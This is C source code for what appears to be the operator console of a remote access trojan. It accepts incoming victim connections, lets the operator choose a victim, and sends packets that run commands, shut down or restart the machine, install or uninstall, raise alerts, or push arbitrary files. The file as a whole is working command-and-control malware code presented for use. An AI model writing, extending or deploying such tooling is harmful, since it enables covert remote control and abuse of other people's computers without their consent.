#include "clients_manager.h"
#include "log.h"
#include "net_util.h"

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <synchapi.h>

static void init_server_socket(SOCKET *server) {
  AddrInfo hints;
  AddrInfo *result = NULL;
  setaddrinfo(&hints);
  if (getaddrinfo(NULL, DEFAULT_PORT, &hints, &result) != 0) {
    LOG_ERR("getaddrinfo failed (%d)", WSAGetLastError());
    *server = INVALID_SOCKET;
    return;
  }
  *server = socket(result->ai_family, result->ai_socktype, result->ai_protocol);
  if (*server == INVALID_SOCKET) {
    LOG_ERR("%d\n", WSAGetLastError());
    freeaddrinfo(result);
    return;
  }
  if (bind(*server, result->ai_addr, (int)result->ai_addrlen) == SOCKET_ERROR) {
    LOG_ERR("bind failed (%d)\n", WSAGetLastError());
    freeaddrinfo(result);
    closesocket(*server);
    *server = INVALID_SOCKET;
    return;
  }
  freeaddrinfo(result);
  result = NULL;
  if (listen(*server, SOMAXCONN) == SOCKET_ERROR) {
    LOG_ERR("listen failed (%d)\n", WSAGetLastError());
    closesocket(*server);
    *server = INVALID_SOCKET;
    return;
  }
}

static void read_alert(ratpacket_t *p) {
  alert_t *alert = (alert_t *)&p->data;
  puts("enter title:");
  fgets(alert->title, sizeof(alert->title), stdin);
  puts("enter text:");
  fgets(alert->text, sizeof(alert->text), stdin);
  puts("enter amount:");
  char num_buf[9 + 2]; // max int len
  fgets(num_buf, sizeof(num_buf), stdin);
  alert->amount = atoi(num_buf);
}

static ratpacket_t *read_file_entry() {
  ratpacket_t *p = NULL;
  FILE *f;
  char name[256];
  puts("enter file path:");
  fgets(name, sizeof(name), stdin);
  int path_len = strlen(name);
  if (name[path_len - 1] == '\n')
    name[path_len - 1] = '\0';
  if (fopen_s(&f, name, "rb")) {
    LOG_DEBUG("read path %s failed");
    return p;
  }
  puts("enter client file name:");
  fgets(name, sizeof(name), stdin);
  int name_len = strlen(name);
  if (name[name_len - 1] == '\n') {
    name[name_len - 1] = '\0';
  } else
    ++name_len;
  fseek(f, 0, SEEK_END);
  int file_size = ftell(f);
  fseek(f, 0, SEEK_SET);
  p = malloc(sizeof(*p) + name_len + file_size);
  if (!p) {
    LOG_DEBUG("malloc failed");
    return p;
  }
  p->op = RAT_PACKET_FILE;
  p->data_len = file_size + name_len;
  memcpy(p->data, name, name_len);
  int read_result = fread(p->data + name_len, 1, file_size, f);
  if (read_result != file_size) {
    free(p);
    LOG_DEBUG("fread expected %d bytes but got %d", file_size, read_result);
    return NULL;
  }
  return p;
}

static int read_ratpacket(ratpacket_t **pp, int *allocated) {
  ratpacket_t *p = *pp;
  puts("enter opcode:");
#define _(s, v, n) printf("%d. %s\n", ((v) + 1), n);
  FOREACH_RAT_OPCODE
#undef _
  if (fgets((char *)p, RAT_OPCODE_MAX_LEN + 2, stdin) == NULL) {
    return 1;
  }
  p->op = atoi((char *)p) - 1;
  switch (p->op) {
  case RAT_PACKET_DISCONNECT:
  case RAT_PACKET_RESTART:
  case RAT_PACKET_SHUTDOWN:
  case RAT_PACKET_TURN_OFF:
  case RAT_PACKET_TURN_ON:
  case RAT_PACKET_INSTALL:
  case RAT_PACKET_UNINSTALL:
    break;
  case RAT_PACKET_CMD:
  case RAT_PACKET_ECHO:
    puts("enter data:");
    fgets((char *)p->data, RAT_DATA_SIZE, stdin);
    p->data_len = strlen((char *)p->data) + 1;
    break;
  case RAT_PACKET_ALERT:
    p->data_len = sizeof(alert_t);
    read_alert(p);
    alert_t *alert = (alert_t *)p->data;
    LOG_DEBUG("alert title=\"%s\" text\"%s\" amount=\"%d\"", alert->title,
              alert->text, alert->amount);
    break;
  case RAT_PACKET_FILE:
    p = read_file_entry();
    if (p) {
      *allocated = 1;
    } else
      LOG_ERR("read file entry failed");
    break;
  default:
    LOG_DEBUG("unimplemented opcode %s (%d)", rat_opcode_to_str(p->op), p->op);
    return 1;
  }
  *pp = p;
  return 0;
}

static void handle_clients(Server *server) {
  char server_buf[DEFAULT_BUFLEN];
  ratpacket_t *p = (ratpacket_t *)server_buf;
  int allocated = 0;
  LOG_DEBUG("started");
  HANDLE client_handler = create_thread(accept_clients, (void *)server);
  while (1) {
    int conn_count = 0;
    for (int i = 0; i < MAX_CLIENTS; i++) {
      if (server->clients[i].conn == INVALID_SOCKET)
        continue;
      if (conn_count == 0)
        puts("Choose client:");
      printf("%d. %s\n", i, server->clients[i].addr);
      ++conn_count;
    }
    if (!conn_count) {
      puts("no clients connected, sleeping...");
      Sleep(1000 * 60);
      continue;
    }
    fgets(server_buf, sizeof(server_buf), stdin);
    int index = atoi(server_buf);
    SOCKET *client = &server->clients[index].conn;
    if (index >= MAX_CLIENTS || *client == INVALID_SOCKET) {
      LOG_ERR("client %d doesn't exist", index);
      continue;
    }
    if (read_ratpacket(&p, &allocated)) {
      LOG_ERR("read rat packet from user failed");
      continue;
    }
    if (p->op == RAT_PACKET_DISCONNECT) {
      if (shutdown(*client, SD_SEND) == SOCKET_ERROR) {
        LOG_ERR("shutdown failed, error: %d", WSAGetLastError());
      }
      close_client(client);
    }
    if (send(*client, (char *)p, sizeof(*p), 0) == SOCKET_ERROR) {
      LOG_ERR("send rat header failed with %d", WSAGetLastError());
      close_client(client);
    }
    if (!p->data_len)
      continue;
    if (send(*client, (char *)p->data, p->data_len, 0) == SOCKET_ERROR) {
      LOG_ERR("send rat data failed with %d", WSAGetLastError());
      close_client(client);
    }
    if (!allocated)
      continue;
    free(p);
    p = (ratpacket_t *)server_buf;
    allocated = 0;
  }
  LOG_DEBUG("shutting down");
}

int main() {
  WSADATA wsa;
  if (WSAStartup(MAKEWORD(2, 2), &wsa) != 0) {
    LOG_ERR("init error: %d\n", WSAGetLastError());
    return 1;
  }
  Server server;
  init_server_socket(&server.conn);
  if (server.conn == INVALID_SOCKET) {
    LOG_ERR("init server socket failed");
    goto exit;
  }
  for (int i = 0; i < MAX_CLIENTS; i++) {
    server.clients[i].conn = INVALID_SOCKET;
  }
  handle_clients(&server);
exit:
  closesocket(server.conn);
  WSACleanup();
  return 0;
}